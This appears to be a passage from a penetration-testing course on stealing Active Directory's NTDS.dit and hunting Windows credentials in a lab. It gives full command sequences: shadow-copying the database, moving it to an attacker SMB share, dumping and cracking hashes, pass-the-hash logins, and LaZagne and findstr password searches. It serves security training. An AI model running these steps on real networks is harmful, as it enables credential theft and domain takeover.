<p><code>NT Directory Services</code> (<code>NTDS</code>) is the directory service used with AD to find &amp; organize network resources. Recall that <code>NTDS.dit</code> file is stored at <code>%systemroot%/ntds</code> on the domain controllers in a <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model">forest</a>. The <code>.dit</code> stands for <a href="https://docs.oracle.com/cd/E19901-01/817-7607/dit.html">directory information tree</a>. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module&#39;s <code>Attacking SAM, SYSTEM, and SECURITY</code> section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.</p>
<p><strong>Connecting to a DC with Evil-WinRM</strong></p>
<p>We can connect to a target DC using the credentials we captured.</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.57</span>  -u bwilliamson -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'P@55w0rd!'</span>
</code></pre>
<p>Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.</p>
<p><strong>Checking local group membership</strong></p>
<p>Once connected, we can check to see what privileges <code>bwilliamson</code> has. We can start with looking at the local group membership using the command:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">*Evil</span>-WinRM* PS C:\&gt; net localgroup

Aliases <span class="hljs-keyword">for</span> \\DC01

-------------------------------------------------------------------------------
<span class="hljs-symbol">*Access</span> Control Assistance Operators
<span class="hljs-symbol">*Account</span> Operators
<span class="hljs-symbol">*Administrators</span>
<span class="hljs-symbol">*Allowed</span> RODC Password Replication Group
<span class="hljs-symbol">*Backup</span> Operators
<span class="hljs-symbol">*Cert</span> Publishers
<span class="hljs-symbol">*Certificate</span> Service DCOM Access
<span class="hljs-symbol">*Cryptographic</span> Operators
<span class="hljs-symbol">*Denied</span> RODC Password Replication Group
<span class="hljs-symbol">*Distributed</span> COM Users
<span class="hljs-symbol">*DnsAdmins</span>
<span class="hljs-symbol">*Event</span> Log Readers
<span class="hljs-symbol">*Guests</span>
<span class="hljs-symbol">*Hyper</span>-V Administrators
<span class="hljs-symbol">*IIS_IUSRS</span>
<span class="hljs-symbol">*Incoming</span> Forest Trust Builders
<span class="hljs-symbol">*Network</span> Configuration Operators
<span class="hljs-symbol">*Performance</span> Log Users
<span class="hljs-symbol">*Performance</span> Monitor Users
<span class="hljs-symbol">*Pre</span>-Windows <span class="hljs-number">2000</span> Compatible Access
<span class="hljs-symbol">*Print</span> Operators
<span class="hljs-symbol">*RAS</span> <span class="hljs-keyword">and</span> IAS Servers
<span class="hljs-symbol">*RDS</span> Endpoint Servers
<span class="hljs-symbol">*RDS</span> Management Servers
<span class="hljs-symbol">*RDS</span> Remote Access Servers
<span class="hljs-symbol">*Remote</span> Desktop Users
<span class="hljs-symbol">*Remote</span> Management Users
<span class="hljs-symbol">*Replicator</span>
<span class="hljs-symbol">*Server</span> Operators
<span class="hljs-symbol">*Storage</span> Replica Administrators
<span class="hljs-symbol">*Terminal</span> Server License Servers
<span class="hljs-symbol">*Users</span>
<span class="hljs-symbol">*Windows</span> Authorization Access Group
The command completed successfully.
</code></pre>
<p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (<code>Administrators group</code>) or Domain Admin (<code>Domain Admins group</code>) (or equivalent) rights. We also will want to check what domain privileges we have.</p>
<p><strong>Checking user account privileges including domain</strong></p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">bwilliamson</span>

<span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          <span class="hljs-number">000</span> (System Default)
Account active               Yes
Account expires              Never

Password last set            <span class="hljs-number">1</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">48</span>:<span class="hljs-number">58</span> PM
Password expires             Never
Password changeable          <span class="hljs-number">1</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">48</span>:<span class="hljs-number">58</span> PM
Password required            Yes
<span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes

Workstations allowed         All
Logon script
<span class="hljs-keyword">User</span> <span class="hljs-title">profile</span>
Home directory
Last logon                   <span class="hljs-number">1</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">07</span>:<span class="hljs-number">49</span> PM

Logon hours allowed          All

Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>
Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users         *Domain Admins
The command completed successfully.
</code></pre>
<p>This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.</p>
<p><strong>Creating shadow copy of C:</strong></p>
<p>We can use <code>vssadmin</code> to create a <a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">Volume Shadow Copy</a> (<code>VSS</code>) of the <code>C:</code> drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on <code>C:</code> as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read &amp; written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:

vssadmin <span class="hljs-number">1.1</span> - <span class="hljs-keyword">Volume</span><span class="bash"> Shadow Copy Service administrative <span class="hljs-built_in">command</span>-line tool
</span>(C) Copyright <span class="hljs-number">2001</span>-<span class="hljs-number">2013</span> Microsoft Corp.

Successfully created shadow <span class="hljs-keyword">copy</span><span class="bash"> <span class="hljs-keyword">for</span> <span class="hljs-string">'C:\'</span>
</span>    Shadow <span class="hljs-keyword">Copy</span><span class="bash"> ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
</span>    Shadow <span class="hljs-keyword">Copy</span><span class="bash"> Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span>
</code></pre>
<p><strong>Copying NTDS.dit from the VSS</strong></p>
<p>We can then copy the <code>NTDS.dit</code> file from the volume shadow copy of <code>C:</code> onto another location on the drive to prepare to move NTDS.dit to our attack host.</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:<span class="hljs-symbol">\N</span>TDS&gt; cmd.exe /c copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy2<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\N</span>TDS.dit c:<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\N</span>TDS.dit

        1 file(s) copied.
</code></pre>
<p>Before copying <code>NTDS.dit</code> to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the <code>Attacking SAM, SYSTEM, and SECURITY</code> section to review that method if needed.</p>
<p>Note: As was the case with <code>SAM</code>, the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>. In order to successfully extract the hashes, one must download both files.</p>
<p><strong>Transferring NTDS.dit to attack host</strong></p>
<p>Now <code>cmd.exe /c move</code> can be used to move the file from the target DC to the share on our attack host.</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">*Evil-WinRM* PS C:<span class="hljs-symbol">\N</span>TDS&gt; cmd.exe /c move C:<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\N</span>TDS.dit <span class="hljs-symbol">\\</span>10.10.15.30<span class="hljs-symbol">\C</span>ompData 

        1 file(s) moved.
</code></pre>
<p><strong>Extracting hashes from NTDS.dit</strong></p>
<p>With a copy of <code>NTDS.dit</code> on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket&#39;s <code>secretsdump</code>:</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -<span class="hljs-built_in">system</span> SYSTEM LOCAL

Impacket v0.<span class="hljs-number">12.0</span> - Copyright Fortra, LLC <span class="hljs-built_in">and</span> its affiliated companies 

[*] Target <span class="hljs-built_in">system</span> bootKey: <span class="hljs-number">0</span>x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching <span class="hljs-keyword">for</span> pekList, <span class="hljs-keyword">be</span> patient
[*] PEK # <span class="hljs-number">0</span> found <span class="hljs-built_in">and</span> decrypted: <span class="hljs-number">086</span>ab260718494c3a503c47d430a92a4
[*] Reading <span class="hljs-built_in">and</span> decrypting hashes from NTDS.dit 
Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">64</span>f12cddaa88057e06a81b54e73b949<span class="hljs-variable">b:</span>::
Gues<span class="hljs-variable">t:501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtg<span class="hljs-variable">t:502</span>:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<span class="hljs-symbol">&lt;SNIP&gt;</span>
</code></pre>
<p><strong>A faster method: Using NetExec to capture NTDS.dit</strong></p>
<p>Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec smb <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span> -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\<span class="hljs-number">174556000</span>
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\<span class="hljs-number">174556000</span>
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [+] Deleted C:\Windows\Temp\<span class="hljs-number">174556000</span> remote dump directory
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         DC01$:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         krbtgt:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jim:<span class="hljs-number">1104</span>:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-IAUBULPG5MZ:<span class="hljs-number">1105</span>:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-NKHHJGP3SMT:<span class="hljs-number">1106</span>:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-K5E9CWYEG7Z:<span class="hljs-number">1107</span>:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-5MG4NRVHF2W:<span class="hljs-number">1108</span>:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-UISCTR0XLKW:<span class="hljs-number">1109</span>:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-ETN7BWMPGXD:<span class="hljs-number">1110</span>:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\bwilliamson:<span class="hljs-number">1125</span>:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\bburgerstien:<span class="hljs-number">1126</span>:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jstevenson:<span class="hljs-number">1131</span>:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jjohnson:<span class="hljs-number">1133</span>:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jdoe:<span class="hljs-number">1134</span>:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Administrator:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Administrator:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         DC01$:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         DC01$:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         krbtgt:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         krbtgt:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:d2377357d473a5309505bfa994158263
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>     DC01         [+] Dumped <span class="hljs-number">61</span> NTDS hashes to /home/bob/.nxc/logs/DC01_10<span class="hljs-meta">.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57_2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25_084640.</span>ntds of which <span class="hljs-number">15</span> were added to the database
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    <span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57</span>   <span class="hljs-number">445</span>    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10<span class="hljs-meta">.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.57_2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">25_084640.</span>ntds | cut -d <span class="hljs-string">':'</span> -f1
</code></pre>
<h3 id="cracking-hashes-and-gaining-credentials">Cracking hashes and gaining credentials</h3>
<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy and paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p>
<p><strong>Cracking a single hash with Hashcat</strong></p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /</span>usr<span class="hljs-regexp">/share/</span>wordlists/rockyou.txt
<span class="hljs-symbol">
64f12cddaa88057e06a81b54e73b949b:</span>Password1
</code></pre>
<p>In many of the techniques we have covered so far, we have had success in cracking hashes we&#39;ve obtained.</p>
<p><code>What if we are unsuccessful in cracking a hash?</code></p>
<h3 id="pass-the-hash-pth-considerations">Pass the Hash (PtH) considerations</h3>
<p>We can still use hashes to attempt to authenticate with a system using a type of attack called <code>Pass-the-Hash</code> (<code>PtH</code>). A PtH attack takes advantage of the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLM authentication protocol</a> to authenticate a user using a password hash. Instead of <code>username</code>:<code>clear-text password</code> as the format for login, we can instead use <code>username</code>:<code>password hash</code>. Here is an example of how this would work:</p>
<p><strong>Pass the Hash (PtH) with Evil-WinRM Example</strong></p>
<p>&#x20; Attacking Active Directory and NTDS.dit</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ evil-winrm -i <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.57</span> -u Administrator -H <span class="hljs-number">64</span>f12cddaa88057e06a81b54e73b949b
</code></pre>
<p>We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module <code>AD Enumeration and Attacks</code>.</p>
<hr>
<h2 id="credential-hunting-in-windows">Credential Hunting in Windows</h2>
<p>Once we have access to a target Windows machine through the GUI or CLI, incorporating credential hunting into our approach can provide significant advantages. <code>Credential hunting</code> is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let&#39;s place ourselves in a scenario. We have gained access to an IT admin&#39;s Windows 10 workstation through RDP.</p>
<h3 id="search-centric">Search-centric</h3>
<p>Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin&#39;s workstation.</p>
<p><code>What might an IT admin be doing on a day-to-day basis and which of those tasks may require credentials?</code></p>
<p>We can use this question and consideration to refine our search to reduce the need for random guessing as much as possible.</p>
<p><strong>Key terms to search for</strong></p>
<p>Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:</p>
<ul>
<li>Passwords</li>
<li>Passhrases</li>
<li>Keys</li>
<li>Username</li>
<li>User account</li>
<li>Creds</li>
<li>Users</li>
<li>Passkeys</li>
<li>configuration</li>
<li>dbcredential</li>
<li>dbpassword</li>
<li>pwd</li>
<li>Login</li>
<li>Credentials</li>
</ul>
<p>Let&#39;s use some of these key terms to search on the IT admin&#39;s workstation.</p>
<h3 id="search-tools">Search tools</h3>
<p><strong>Windows Search</strong></p>
<p>With access to the GUI, it is worth attempting to use <code>Windows Search</code> to find files on the target using some of the keywords mentioned above.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/WindowsSearch.png" alt="Windows search for &#39;pass&#39; showing &#39;Change your password&#39; in system settings and related options."></p>
<p>By default, it will search various OS settings and the file system for files and applications containing the key term entered in the search bar.</p>
<p><strong>LaZagne</strong></p>
<p>We can also take advantage of third-party tools like <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> to quickly discover credentials that web browsers or other installed applications may insecurely store. LaZagne is made up of <code>modules</code> which each target different software when looking for passwords. Some of the common modules are described in the table below:</p>
<table>
<thead>
<tr>
<th>Module</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>browsers</td>
<td>Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera</td>
</tr>
<tr>
<td>chats</td>
<td>Extracts passwords from various chat applications including Skype</td>
</tr>
<tr>
<td>mails</td>
<td>Searches through mailboxes for passwords including Outlook and Thunderbird</td>
</tr>
<tr>
<td>memory</td>
<td>Dumps passwords from memory, targeting KeePass and LSASS</td>
</tr>
<tr>
<td>sysadmin</td>
<td>Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP</td>
</tr>
<tr>
<td>windows</td>
<td>Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more</td>
</tr>
<tr>
<td>wifi</td>
<td>Dumps WiFi credentials</td>
</tr>
</tbody>
</table>
<p>Note: Web browsers are some of the most interestings placed to search for credentials, due to the fact that many of them offer built-in credential storage. In the most popular browsers, such as <code>Google Chrome</code>, <code>Microsoft Edge</code>, and <code>Firefox</code>, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a> and <a href="https://github.com/ohyicong/decrypt-chrome-passwords">decrypt-chrome-passwords</a>. LaZagne supports <code>35</code> different browsers on Windows.</p>
<p>It would be beneficial to keep a <a href="https://github.com/AlessandroZ/LaZagne/releases/">standalone copy</a> of LaZagne on our attack host so we can quickly transfer it over to the target. <code>LaZagne.exe</code> will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using <code>xfreerdp</code> all we must do is copy and paste into the RDP session we have established.</p>
<p>Once <code>LaZagne.exe</code> is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:</p>
<p>&#x20; Credential Hunting in Windows</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\D</span>esktop&gt; start LaZagne.exe all
</code></pre>
<p>This will execute LaZagne and run <code>all</code> included modules. We can include the option <code>-vv</code> to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.</p>
<p>&#x20; Credential Hunting in Windows</p>
<pre><code class="lang-cmd-session">|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.51</span>
Login: admin
Password: SteveisReallyCool123
Port: <span class="hljs-number">22</span>
</code></pre>
<p>If we used the <code>-vv</code> option, we would see attempts to gather passwords from all LaZagne&#39;s supported software. We can also look on the GitHub page under the supported software section to see all the software LaZagne will try to gather credentials from. It may be a bit shocking to see how easy it can be to obtain credentials in clear text. Much of this can be attributed to the insecure way many applications store credentials.</p>
<p><strong>findstr</strong></p>
<p>We can also use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr">findstr</a> to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p>
<p>&#x20; Credential Hunting in Windows</p>
<pre><code class="lang-cmd-session">C:\&gt; findstr /SIM /C:<span class="hljs-string">"password"</span> *<span class="hljs-selector-class">.txt</span> *<span class="hljs-selector-class">.ini</span> *<span class="hljs-selector-class">.cfg</span> *<span class="hljs-selector-class">.config</span> *<span class="hljs-selector-class">.xml</span> *<span class="hljs-selector-class">.git</span> *<span class="hljs-selector-class">.ps1</span> *.yml
</code></pre>
<h3 id="additional-considerations">Additional considerations</h3>
